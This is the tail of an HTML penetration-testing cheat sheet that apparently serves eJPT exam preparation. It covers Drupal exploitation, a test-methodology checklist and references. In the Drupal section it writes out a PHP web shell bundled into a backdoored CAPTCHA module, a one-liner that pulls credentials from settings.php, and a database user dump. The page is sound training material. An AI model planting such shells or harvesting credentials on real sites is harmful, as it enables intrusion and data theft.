+              <ul><li>Download the most recent version of the module from the Drupal website.<ul><li>wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz</li></ul></li><li>Once downloaded go to <strong><code>Administration</code></strong> &gt; <strong><code>Reports</code></strong> &gt; <strong><code>Available updates</code></strong>.</li><li>Click on <strong><code>Browse</code></strong><code>,</code> select the file from the directory we downloaded it to, and then click <strong><code>Install</code></strong>.</li><li>Once the module is installed, we can click on <strong><code>Content</code></strong> and <strong>create a new basic page</strong>, similar to how we did in the Drupal 7 example. Again, be sure to <strong>select <code>PHP code</code> from the <code>Text format</code> dropdown</strong>.</li></ul>
+              <h4 id="backdoored-module">16.5.4 Backdoored Module</h4>
+              <p>A backdoored module can be created by <strong>adding a shell to an existing module</strong>. Modules can be found on the drupal.org website. Let's pick a module such as <a href="https://www.drupal.org/project/captcha" target="_blank" rel="noopener noreferrer">CAPTCHA</a>. Scroll down and copy the link for the tar.gz <a href="https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz" target="_blank" rel="noopener noreferrer">archive</a>.</p>
+              <ul><li>Download the archive and extract its contents.</li></ul>
+              <pre><code class="language-bash">wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
+tar xvf captcha-8.x-1.2.tar.gz</code></pre>
+              <ul><li>Create a <strong>PHP web shell</strong> with the contents:</li></ul>
+              <pre><code class="language-php">&lt;?php
+system($_GET["cmd"]);
+?&gt;</code></pre>
+              <ul><li>Next, we need to create a <strong><code>.htaccess</code></strong> file to give ourselves access to the folder. This is necessary as Drupal denies direct access to the <strong><code>/modules</code></strong> folder.</li></ul>
+              <pre><code class="language-bash">&lt;IfModule mod_rewrite.c&gt;
+RewriteEngine On
+RewriteBase /
+&lt;/IfModule&gt;</code></pre>
+              <ul><li>The configuration above will apply rules for the / folder when we request a file in /modules. Copy both of these files to the captcha folder and create an archive.</li></ul>
+              <pre><code class="language-bash">mv shell.php .htaccess captcha
+tar cvf captcha.tar.gz captcha/</code></pre>
+              <ul><li>Assuming we have <strong>administrative access</strong> to the website, click on <strong><code>Manage</code></strong> and then <strong><code>Extend</code></strong> on the sidebar. Next, click on the <strong><code>+ Install new module</code></strong> button, and we will be taken to the install page, such as <code>http://drupal-site.local/admin/modules/install</code> Browse to the backdoored Captcha archive and click <strong><code>Install</code></strong>.</li><li>Once the installation succeeds, browse to <strong><code>/modules/captcha/shell.php</code></strong> to execute commands.</li></ul>
+              <h4 id="post-exploitation-1">16.5.5 Post Exploitation</h4>
+              <h4 id="read-settingsphp">16.5.6 Read settings.php</h4>
+              <pre><code class="language-bash">find / -name settings.php -exec grep "drupal_hash_salt\|'database'\|'username'\|'password'\|'host'\|'port'\|'driver'\|'prefix'" {} \; 2&gt;/dev/null</code></pre>
+              <h4 id="dump-users-from-db">16.5.7 Dump users from DB</h4>
+              <pre><code class="language-bash">mysql -u drupaluser --password='2r9u8hu23t532erew' -e 'use drupal; select * from users'</code></pre>
+              <h3 id="cve-2018-7600-drupalgeddon-2">16.6 [CVE-2018-7600] Drupalgeddon 2</h3>
+              <p><a href="https://ine.com/blog/cve-2018-7600-drupalgeddon-2" target="_blank" rel="noopener noreferrer">https://ine.com/blog/cve-2018-7600-drupalgeddon-2</a></p>
+              <p>In late March 2018, a critical vulnerability was uncovered in Drupal CMS. <strong>Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1</strong> versions were affected by this vulnerability.</p>
+              <p>It allows remote attackers to execute arbitrary code because of an issue affecting multiple subsystems with default or standard module configurations.</p>
+              <p>A lot of PoC is available to exploit this vulnerability.</p>
+
+              <h2 id="methodology">17. Methodology</h2>
+              <p>A repeatable game plan for the eJPT exam &mdash; a black-box internal network assessment across multiple hosts with pivoting and web targets. Work host-by-host, keep notes and evidence as you go, and loop enumeration &rarr; exploitation &rarr; post-exploitation every time you gain a new foothold or reach a new subnet.</p>
+              <h3 id="methodology-pre-engagement-scoping">17.1 Pre-Engagement &amp; Scoping</h3>
+              <ul>
+                <li><input type="checkbox" data-id="m-scope"> Confirm scope: in-scope subnets/IPs/URLs, rules of engagement, testing window, and what proof is required</li>
+                <li><input type="checkbox" data-id="m-connect"> Connect to the lab/VPN and confirm reachability to the target network</li>
+                <li><input type="checkbox" data-id="m-notes"> Set up note-taking (CherryTree / Obsidian) and an evidence folder per host</li>
+              </ul>
+              <h3 id="methodology-host-discovery">17.2 Host Discovery &amp; Network Mapping</h3>
+              <ul>
+                <li><input type="checkbox" data-id="m-self"> Identify your own IP and subnet (<code>ip a</code>, <code>ip route</code>) and infer the in-scope range</li>
+                <li><input type="checkbox" data-id="m-sweep"> Sweep for live hosts (<code>fping -ag</code>, <code>nmap -sn</code>) and build a host list</li>
+                <li><input type="checkbox" data-id="m-topo"> Note dual-homed hosts and routes that could become pivot points</li>
+              </ul>
+              <h3 id="methodology-port-service-enum">17.3 Port Scanning &amp; Service Enumeration</h3>
+              <ul>
+                <li><input type="checkbox" data-id="m-tcp"> Full TCP scan each host (<code>nmap -p- -sV -sC</code>), then targeted UDP (<code>nmap -sU --top-ports 100</code>)</li>
+                <li><input type="checkbox" data-id="m-record"> Record every open port, service, and version into per-host notes</li>
+                <li><input type="checkbox" data-id="m-deep"> Enumerate each service deeply (SMB, FTP, SSH, HTTP, SMTP, SNMP, MySQL/MSSQL, RDP)</li>
+              </ul>
+              <h3 id="methodology-web-enum">17.4 Web Application Enumeration</h3>
+              <ul>
+                <li><input type="checkbox" data-id="m-fingerprint"> Fingerprint the stack (<code>whatweb</code>, Wappalyzer) and brute dirs/files/vhosts (<code>gobuster</code>, <code>feroxbuster</code>)</li>
+                <li><input type="checkbox" data-id="m-cms"> Identify any CMS (WordPress / Drupal / Joomla) and run targeted scanners (<code>wpscan</code>, <code>droopescan</code>)</li>
+                <li><input type="checkbox" data-id="m-webflaws"> Test for common flaws: SQLi, LFI/RFI, file upload, command injection, auth bypass</li>
+              </ul>
+              <h3 id="methodology-vuln-assessment">17.5 Vulnerability Assessment</h3>
+              <ul>
+                <li><input type="checkbox" data-id="m-cve"> Map service versions to known CVEs (<code>searchsploit</code>, NVD) and prioritise by exploitability</li>
+                <li><input type="checkbox" data-id="m-scan"> Run targeted checks (<code>nmap --script vuln</code>, Nessus if available)</li>
+                <li><input type="checkbox" data-id="m-validate"> Validate findings manually to weed out false positives</li>
+              </ul>
+              <h3 id="methodology-exploitation">17.6 Exploitation &amp; Initial Access</h3>
+              <ul>
+                <li><input type="checkbox" data-id="m-match"> Match the exact version before running any public exploit &mdash; read the code first</li>
+                <li><input type="checkbox" data-id="m-exploit"> Use Metasploit modules or manual exploits; catch the shell with a listener (<code>nc -lvnp</code>)</li>
+                <li><input type="checkbox" data-id="m-brute"> Brute-force weak service logins where in scope (<code>hydra</code>); reuse any discovered credentials</li>
+              </ul>
+              <h3 id="methodology-post-exploitation">17.7 Post-Exploitation &amp; Looting</h3>
+              <ul>
+                <li><input type="checkbox" data-id="m-stabilise"> Stabilise the shell (upgrade to a full TTY); identify OS, user, and privileges</li>
+                <li><input type="checkbox" data-id="m-loot"> Loot credentials, config files, hashes, SSH keys, and command history</li>
+                <li><input type="checkbox" data-id="m-privesc"> Escalate privileges (Linux: <code>sudo -l</code>, SUID, kernel; Windows: services, tokens, misconfigs)</li>
+              </ul>
+              <h3 id="methodology-pivoting">17.8 Pivoting &amp; Lateral Movement</h3>
+              <ul>
+                <li><input type="checkbox" data-id="m-routes"> Identify new subnets reachable from the compromised host (<code>ip route</code>, <code>arp -a</code>)</li>
+                <li><input type="checkbox" data-id="m-pivot"> Set up pivoting (Metasploit <code>autoroute</code> + SOCKS, or SSH tunneling) to reach internal hosts</li>
+                <li><input type="checkbox" data-id="m-repeat"> Repeat enumeration &rarr; exploitation against the newly reachable targets</li>
+              </ul>
+              <h3 id="methodology-reporting">17.9 Reporting</h3>
+              <ul>
+                <li><input type="checkbox" data-id="m-document"> Document each host: open ports, vulnerabilities, exploitation steps, and proof (screenshots, flags)</li>
+                <li><input type="checkbox" data-id="m-evidence"> Capture commands and evidence as you go; note remediation recommendations</li>
+                <li><input type="checkbox" data-id="m-answers"> Answer the exam questions clearly, with reproduction steps for each finding</li>
+              </ul>
+
+              <h2 id="references">18. References</h2>
+              <p>[1] INE / eLearnSecurity, &quot;eJPT &mdash; Junior Penetration Tester Certification,&quot; [Online]. Available: <a href="https://security.ine.com/certifications/ejpt-certification/" target="_blank" rel="noopener noreferrer">https://security.ine.com/certifications/ejpt-certification/</a>.</p>
+              <p>[2] syselement, &quot;eJPT Course Notes,&quot; [Online]. Available: <a href="https://blog.syselement.com/ine/courses/ejpt" target="_blank" rel="noopener noreferrer">https://blog.syselement.com/ine/courses/ejpt</a>.</p>
+              <p>[3] HackTricks, &quot;Pentesting Methodology &amp; Service Cheatsheets,&quot; [Online]. Available: <a href="https://book.hacktricks.xyz/" target="_blank" rel="noopener noreferrer">https://book.hacktricks.xyz/</a>.</p>
+              <p>[4] Nmap, &quot;Reference Guide,&quot; [Online]. Available: <a href="https://nmap.org/book/man.html" target="_blank" rel="noopener noreferrer">https://nmap.org/book/man.html</a>.</p>
+              <p>[5] OffSec, &quot;Metasploit Unleashed,&quot; [Online]. Available: <a href="https://www.offsec.com/metasploit-unleashed/" target="_blank" rel="noopener noreferrer">https://www.offsec.com/metasploit-unleashed/</a>.</p>
+              <p>[6] swisskyrepo, &quot;PayloadsAllTheThings,&quot; [Online]. Available: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="noopener noreferrer">https://github.com/swisskyrepo/PayloadsAllTheThings</a>.</p>
+              <p>[7] GTFOBins, &quot;Unix Binaries for Privilege Escalation,&quot; [Online]. Available: <a href="https://gtfobins.github.io/" target="_blank" rel="noopener noreferrer">https://gtfobins.github.io/</a>.</p>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </section><!-- End Cheatsheet Section -->
+
+  </main><!-- End #main -->
+
+  <!-- ======= Index ======= -->
+  <div class="index-btn" onclick="toggleIndex()">Index</div>
+  <div id="index" class="index">
+    <div class="container mt-3">
+      <div class="input-group mb-3">
+        <input type="text" id="search-input" class="form-control" placeholder="Search sections..." aria-label="Search sections" aria-describedby="search-button">
+        <button class="btn btn-primary" type="button" id="search-button">
+          <i class="bi bi-search"></i>
+        </button>
+      </div>
+    </div>
+    <button class="expand-collapse-btn" onclick="toggleAll()">Show/Hide All</button>
+
+    <div class="section-flow-1">
+      <button class="dropdown-btn">1. Networking
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#routing">1.1 Routing</a>
+        <a href="#ip">1.2 IP</a>
+        <a href="#arp">1.3 ARP</a>
+        <a href="#ports">1.4 Ports</a>
+        <a href="#connect-and-scan">1.5 Connect and Scan</a>
+      </div>
+    </div>
+    <div class="section-flow-2">
+      <button class="dropdown-btn">2. Information Gathering
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#passive">2.1 Passive</a>
+        <a href="#google-dorks">2.2 Google Dorks</a>
+        <a href="#dns">2.3 DNS</a>
+        <a href="#host-discovery">2.4 Host Discovery</a>
+      </div>
+    </div>
+    <div class="section-flow-3">
+      <button class="dropdown-btn">3. Footprinting &amp; Scanning
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#network-discovery">3.1 Network Discovery</a>
+      </div>
+    </div>
+    <div class="section-flow-4">
+      <button class="dropdown-btn">4. Enumeration
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <div class="nested-dropdown">
+          <button class="nested-dropdown-btn">4.1 SMB
+            <i class="bi bi-caret-down-fill"></i>
+          </button>
+          <div class="nested-dropdown-container">
+        <a href="#nmap">4.1.1 Nmap</a>
+        <a href="#nmblookup">4.1.2 Nmblookup</a>
+        <a href="#smbmap">4.1.3 SMBMap</a>
+        <a href="#smb-connection">4.1.4 SMB Connection</a>
+        <a href="#rpcclient">4.1.5 RPCClient</a>
+        <a href="#enum4linux">4.1.6 Enum4Linux</a>
+        <a href="#hydra">4.1.7 Hydra</a>
+        <a href="#metasploit">4.1.8 Metasploit</a>
+          </div>
+        </div>
+        <div class="nested-dropdown">
+          <button class="nested-dropdown-btn">4.2 FTP
+            <i class="bi bi-caret-down-fill"></i>
+          </button>
+          <div class="nested-dropdown-container">
+        <a href="#nmap-1">4.2.1 Nmap</a>
+        <a href="#ftp-client">4.2.2 Ftp Client</a>
+        <a href="#hydra-1">4.2.3 Hydra</a>
+          </div>
+        </div>
+        <div class="nested-dropdown">
+          <button class="nested-dropdown-btn">4.3 SSH
+            <i class="bi bi-caret-down-fill"></i>
+          </button>
+          <div class="nested-dropdown-container">
+        <a href="#nmap-2">4.3.1 Nmap</a>
+        <a href="#netcat">4.3.2 Netcat</a>
+        <a href="#ssh-1">4.3.3 SSH</a>
+        <a href="#hydra-2">4.3.4 Hydra</a>
+        <a href="#metasploit-1">4.3.5 Metasploit</a>
+          </div>
+        </div>
+        <div class="nested-dropdown">
+          <button class="nested-dropdown-btn">4.4 HTTP
+            <i class="bi bi-caret-down-fill"></i>
+          </button>
+          <div class="nested-dropdown-container">
+        <a href="#nmap-3">4.4.1 Nmap</a>
+        <a href="#alternative">4.4.2 Alternative</a>
+        <a href="#metasploit-2">4.4.3 Metasploit</a>
+          </div>
+        </div>
+        <div class="nested-dropdown">
+          <button class="nested-dropdown-btn">4.5 SQL
+            <i class="bi bi-caret-down-fill"></i>
+          </button>
+          <div class="nested-dropdown-container">
+        <a href="#nmap-4">4.5.1 Nmap</a>
+        <a href="#hydra-3">4.5.2 Hydra</a>
+        <a href="#metasploit-3">4.5.3 Metasploit</a>
+          </div>
+        </div>
+        <div class="nested-dropdown">
+          <button class="nested-dropdown-btn">4.6 SMTP
+            <i class="bi bi-caret-down-fill"></i>
+          </button>
+          <div class="nested-dropdown-container">
+        <a href="#nmap-5">4.6.1 Nmap</a>
+        <a href="#metasploit-4">4.6.2 Metasploit</a>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="section-flow-5">
+      <a href="#vulnerability-assessment">5. Vulnerability Assessment</a>
+    </div>
+    <div class="section-flow-6">
+      <button class="dropdown-btn">6. Host Based Attacks
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <div class="nested-dropdown">
+          <button class="nested-dropdown-btn">6.1 Windows Exploitation
+            <i class="bi bi-caret-down-fill"></i>
+          </button>
+          <div class="nested-dropdown-container">
+        <a href="#iis-webdav">6.1.1 IIS WEBDAV</a>
+          </div>
+        </div>
+        <div class="nested-dropdown">
+          <button class="nested-dropdown-btn">6.2 SMB
+            <i class="bi bi-caret-down-fill"></i>
+          </button>
+          <div class="nested-dropdown-container">
+        <a href="#nmap-6">6.2.1 Nmap</a>
+        <a href="#metasploit-5">6.2.2 Metasploit</a>
+        <a href="#rdp">6.2.3 RDP</a>
+        <a href="#winrm">6.2.4 WINRM</a>
+          </div>
+        </div>
+        <div class="nested-dropdown">
+          <button class="nested-dropdown-btn">6.3 Windows Privilege Escalation
+            <i class="bi bi-caret-down-fill"></i>
+          </button>
+          <div class="nested-dropdown-container">
+        <a href="#kernel">6.3.1 Kernel</a>
+        <a href="#uac">6.3.2 UAC</a>
+        <a href="#access-token">6.3.3 Access Token</a>
+          </div>
+        </div>
+        <a href="#windows-credential-dumping">6.4 Windows Credential Dumping</a>
+        <div class="nested-dropdown">
+          <button class="nested-dropdown-btn">6.5 Linux Exploitation
+            <i class="bi bi-caret-down-fill"></i>
+          </button>
+          <div class="nested-dropdown-container">
+        <a href="#shellshock">6.5.1 Shellshock</a>
+        <a href="#ftp-1">6.5.2 FTP</a>
+        <a href="#ssh-2">6.5.3 SSH</a>
+        <a href="#samba">6.5.4 SAMBA</a>
+          </div>
+        </div>
+        <div class="nested-dropdown">
+          <button class="nested-dropdown-btn">6.6 Linux Privilege Escalation
+            <i class="bi bi-caret-down-fill"></i>
+          </button>
+          <div class="nested-dropdown-container">
+        <a href="#kernel-1">6.6.1 Kernel</a>
+        <a href="#cron-jobs">6.6.2 Cron Jobs</a>
+        <a href="#suid">6.6.3 SUID</a>
+          </div>
+        </div>
+        <a href="#linux-credential-dumping">6.7 Linux Credential Dumping</a>
+      </div>
+    </div>
+    <div class="section-flow-7">
+      <button class="dropdown-btn">7. Network Based Attacks
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#wireshark">7.1 Wireshark</a>
+        <a href="#tshark">7.2 TShark</a>
+      </div>
+    </div>
+    <div class="section-flow-8">
+      <button class="dropdown-btn">8. Metasploit
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#meterpreter">8.1 Meterpreter</a>
+        <a href="#info-gathering-enumeration">8.2 Info Gathering &amp; Enumeration</a>
+        <a href="#vulnerability-scanning">8.3 Vulnerability Scanning</a>
+        <div class="nested-dropdown">
+          <button class="nested-dropdown-btn">8.4 Payloads
+            <i class="bi bi-caret-down-fill"></i>
+          </button>
+          <div class="nested-dropdown-container">
+        <a href="#msfvenom-shells">8.4.1 MSFVenom shells</a>
+        <a href="#msf-staged-and-non-staged-payload">8.4.2 MSF Staged and Non Staged Payload</a>
+          </div>
+        </div>
+        <div class="nested-dropdown">
+          <button class="nested-dropdown-btn">8.5 Win Exploitation
+            <i class="bi bi-caret-down-fill"></i>
+          </button>
+          <div class="nested-dropdown-container">
+        <a href="#default-msf-start">8.5.1 Default MSF Start</a>
+        <a href="#hfs">8.5.2 HFS</a>
+        <a href="#smb-2">8.5.3 SMB</a>
+        <a href="#winrm-1">8.5.4 WINRM</a>
+        <a href="#tomcat">8.5.5 TOMCAT</a>
+          </div>
+        </div>
+        <div class="nested-dropdown">
+          <button class="nested-dropdown-btn">8.6 Linux Exploitation
+            <i class="bi bi-caret-down-fill"></i>
+          </button>
+          <div class="nested-dropdown-container">
+        <a href="#ftp-2">8.6.1 FTP</a>
+        <a href="#samba-1">8.6.2 SAMBA</a>
+        <a href="#ssh-3">8.6.3 SSH</a>
+        <a href="#smtp-1">8.6.4 SMTP</a>
+          </div>
+        </div>
+        <a href="#post-exploitation-fundamentals">8.7 Post-Exploitation Fundamentals</a>
+        <div class="nested-dropdown">
+          <button class="nested-dropdown-btn">8.8 Win Post-Exploitation
+            <i class="bi bi-caret-down-fill"></i>
+          </button>
+          <div class="nested-dropdown-container">
+        <a href="#to-search-for-files-and-folders">8.8.1 To search for files and Folders</a>
+        <a href="#httphfs">8.8.2 HTTP/HFS</a>
+        <a href="#uac-1">8.8.3 UAC</a>
+        <a href="#token-impersonation">8.8.4 TOKEN IMPERSONATION</a>
+        <a href="#dump-hashes">8.8.5 DUMP HASHES</a>
+        <a href="#persistence">8.8.6 PERSISTENCE</a>
+        <a href="#clearing">8.8.7 CLEARING</a>
+        <a href="#pivoting">8.8.8 PIVOTING</a>
+          </div>
+        </div>
+        <a href="#linux-post-exploitation">8.9 Linux Post-Exploitation</a>
+        <a href="#armitage">8.10 Armitage</a>
+      </div>
+    </div>
+    <div class="section-flow-9">
+      <button class="dropdown-btn">9. Exploitation
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#vulnerability-scanning-1">9.1 Vulnerability Scanning</a>
+        <a href="#exploits">9.2 Exploits</a>
+        <a href="#shells">9.3 Shells</a>
+        <a href="#frameworks">9.4 Frameworks</a>
+        <div class="nested-dropdown">
+          <button class="nested-dropdown-btn">9.5 Win Exploitation
+            <i class="bi bi-caret-down-fill"></i>
+          </button>
+          <div class="nested-dropdown-container">
+        <a href="#iisftp">9.5.1 IIS/FTP</a>
+        <a href="#openssh">9.5.2 OPENSSH</a>
+        <a href="#smb-3">9.5.3 SMB</a>
+        <a href="#mysql">9.5.4 MYSQL</a>
+          </div>
+        </div>
+        <div class="nested-dropdown">
+          <button class="nested-dropdown-btn">9.6 Linux Exploitation
+            <i class="bi bi-caret-down-fill"></i>
+          </button>
+          <div class="nested-dropdown-container">
+        <a href="#vsftpd">9.6.1 VSFTPD</a>
+          </div>
+        </div>
+        <a href="#obfuscation">9.7 Obfuscation</a>
+      </div>
+    </div>
+    <div class="section-flow-10">
+      <button class="dropdown-btn">10. Post-Exploitation
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#win-local-enumeration">10.1 Win Local Enumeration</a>
+        <a href="#linux-local-enumeration">10.2 Linux Local Enumeration</a>
+        <a href="#transferring-files">10.3 Transferring Files</a>
+        <div class="nested-dropdown">
+          <button class="nested-dropdown-btn">10.4 Shells
+            <i class="bi bi-caret-down-fill"></i>
+          </button>
+          <div class="nested-dropdown-container">
+        <a href="#tty-shells">10.4.1 TTY Shells</a>
+          </div>
+        </div>
+        <a href="#win-privilege-escalation">10.5 Win Privilege Escalation</a>
+        <a href="#linux-privilege-escalation-1">10.6 Linux Privilege Escalation</a>
+        <a href="#win-persistence">10.7 Win Persistence</a>
+        <a href="#linux-persistence">10.8 Linux Persistence</a>
+        <div class="nested-dropdown">
+          <button class="nested-dropdown-btn">10.9 Dumping &amp; Cracking
+            <i class="bi bi-caret-down-fill"></i>
+          </button>
+          <div class="nested-dropdown-container">
+        <a href="#windows">10.9.1 Windows</a>
+        <a href="#linux">10.9.2 Linux</a>
+          </div>
+        </div>
+        <a href="#pivoting-1">10.10 Pivoting</a>
+        <a href="#clearing-tracks">10.11 Clearing Tracks</a>
+      </div>
+    </div>
+    <div class="section-flow-11">
+      <a href="#social-engineering">11. Social Engineering</a>
+    </div>
+    <div class="section-flow-12">
+      <button class="dropdown-btn">12. Web Application Penetration Testing
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#tools">12.1 Tools</a>
+        <a href="#enumeration-scanning">12.2 Enumeration &amp; Scanning</a>
+        <a href="#attacks">12.3 Attacks</a>
+        <div class="nested-dropdown">
+          <button class="nested-dropdown-btn">12.4 SQLMap
+            <i class="bi bi-caret-down-fill"></i>
+          </button>
+          <div class="nested-dropdown-container">
+        <a href="#check-if-injection-exists">12.4.1 Check if injection exists</a>
+        <a href="#get-database-if-injection-exists">12.4.2 Get database if injection Exists</a>
+        <a href="#get-os-shell">12.4.3 Get OS-Shell</a>
+          </div>
+        </div>
+        <div class="nested-dropdown">
+          <button class="nested-dropdown-btn">12.5 XSS
+            <i class="bi bi-caret-down-fill"></i>
+          </button>
+          <div class="nested-dropdown-container">
+        <a href="#hydra-4">12.5.1 Hydra</a>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="section-flow-13">
+      <button class="dropdown-btn">13. Wordpress
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <div class="nested-dropdown">
+          <button class="nested-dropdown-btn">13.1 Basic Information
+            <i class="bi bi-caret-down-fill"></i>
+          </button>
+          <div class="nested-dropdown-container">
+        <a href="#main-wordpress-files">13.1.1 Main WordPress Files</a>
+        <a href="#users-permissions">13.1.2 Users Permissions</a>
+          </div>
+        </div>
+        <div class="nested-dropdown">
+          <button class="nested-dropdown-btn">13.2 Passive Enumeration
+            <i class="bi bi-caret-down-fill"></i>
+          </button>
+          <div class="nested-dropdown-container">
+        <a href="#get-wordpress-version">13.2.1 Get WordPress version</a>
+        <a href="#get-plugins">13.2.2 Get Plugins</a>
+        <a href="#get-themes">13.2.3 Get Themes</a>
+        <a href="#extract-versions-in-general">13.2.4 Extract versions in general</a>
+          </div>
+        </div>
+        <div class="nested-dropdown">
+          <button class="nested-dropdown-btn">13.3 Active enumeration
+            <i class="bi bi-caret-down-fill"></i>
+          </button>
+          <div class="nested-dropdown-container">
+        <a href="#plugins-and-themes">13.3.1 Plugins and Themes</a>
+        <a href="#users">13.3.2 Users</a>
+        <a href="#id-brute">13.3.3 ID Brute</a>
+        <a href="#login-username-enumeration">13.3.4 Login username enumeration</a>
+        <a href="#wpscan">13.3.5 WPScan</a>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="section-flow-14">
+      <a href="#drupal">14. Drupal</a>
+    </div>
+    <div class="section-flow-15">
+      <a href="#discovery">15. Discovery</a>
+    </div>
+    <div class="section-flow-16">
+      <button class="dropdown-btn">16. Drupal Enumeration
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#version">16.1 Version</a>
+        <div class="nested-dropdown">
+          <button class="nested-dropdown-btn">16.2 Username enumeration
+            <i class="bi bi-caret-down-fill"></i>
+          </button>
+          <div class="nested-dropdown-container">
+        <a href="#register">16.2.1 Register</a>
+        <a href="#request-new-password">16.2.2 Request new password</a>
+          </div>
+        </div>
+        <a href="#get-number-of-users">16.3 Get number of users</a>
+        <div class="nested-dropdown">
+          <button class="nested-dropdown-btn">16.4 Hidden pages
+            <i class="bi bi-caret-down-fill"></i>
+          </button>
+          <div class="nested-dropdown-container">
+        <a href="#installed-modules-info">16.4.1 Installed modules info</a>
+          </div>
+        </div>
+        <div class="nested-dropdown">
+          <button class="nested-dropdown-btn">16.5 Automatic
+            <i class="bi bi-caret-down-fill"></i>
+          </button>
+          <div class="nested-dropdown-container">
+        <a href="#rce">16.5.1 RCE</a>
+        <a href="#with-php-filter-module">16.5.2 With PHP Filter Module</a>
+        <a href="#install-php-filter-module">16.5.3 Install PHP Filter Module</a>
+        <a href="#backdoored-module">16.5.4 Backdoored Module</a>
+        <a href="#post-exploitation-1">16.5.5 Post Exploitation</a>
+        <a href="#read-settingsphp">16.5.6 Read settings.php</a>
+        <a href="#dump-users-from-db">16.5.7 Dump users from DB</a>
+          </div>
+        </div>
+        <div class="nested-dropdown">
+          <a href="#cve-2018-7600-drupalgeddon-2">16.6 [CVE-2018-7600] Drupalgeddon 2</a>
+        </div>
+      </div>
+    </div>
+    <div class="section-flow-17">
+      <button class="dropdown-btn">17. Methodology
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#methodology-pre-engagement-scoping">17.1 Pre-Engagement &amp; Scoping</a>
+        <a href="#methodology-host-discovery">17.2 Host Discovery &amp; Network Mapping</a>
+        <a href="#methodology-port-service-enum">17.3 Port Scanning &amp; Service Enumeration</a>
+        <a href="#methodology-web-enum">17.4 Web Application Enumeration</a>
+        <a href="#methodology-vuln-assessment">17.5 Vulnerability Assessment</a>
+        <a href="#methodology-exploitation">17.6 Exploitation &amp; Initial Access</a>
+        <a href="#methodology-post-exploitation">17.7 Post-Exploitation &amp; Looting</a>
+        <a href="#methodology-pivoting">17.8 Pivoting &amp; Lateral Movement</a>
+        <a href="#methodology-reporting">17.9 Reporting</a>
+      </div>
+    </div>
+    <div class="section-flow-18">
+      <a href="#references">18. References</a>
+    </div>
+  </div>
+  <!-- End Index -->
+
+  <!-- ======= Footer ======= -->
+  <footer id="footer">
+    <div class="container">
+      <div class="credits">
+        <p>
+          &copy; Wencheng Xue<br>
+          Penetration Tester &amp; Vulnerability Researcher
+        </p>
+      </div>
+    </div>
+  </footer><!-- End  Footer -->
+
+  <a href="#" class="back-to-top d-flex align-items-center justify-content-center"><i
+      class="bi bi-arrow-up-short"></i></a>
+
+  <!-- Vendor JS Files -->
+  <script src="./vendor/aos/aos.js"></script>
+  <script src="./vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+  <script src="./vendor/isotope-layout/isotope.pkgd.min.js"></script>
+  <script src="./vendor/typed.js/typed.min.js"></script>
+  <!-- Prism JS -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/prism.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-bash.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-powershell.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-csharp.min.js"></script>
+
+  <!-- Template Main JS File -->
+  <script src="./js/main.js"></script>
+
+  <!-- Prism JS Additional Keywords-->
+  <script src="js/prism-langs.js"></script>
+  
+
+  <script src="js/site.js"></script>
+  <script src="js/cheatsheet-index.js"></script>
+
+  <script src="js/methodology-checkboxes.js"></script>
+</body>
+
+</html>
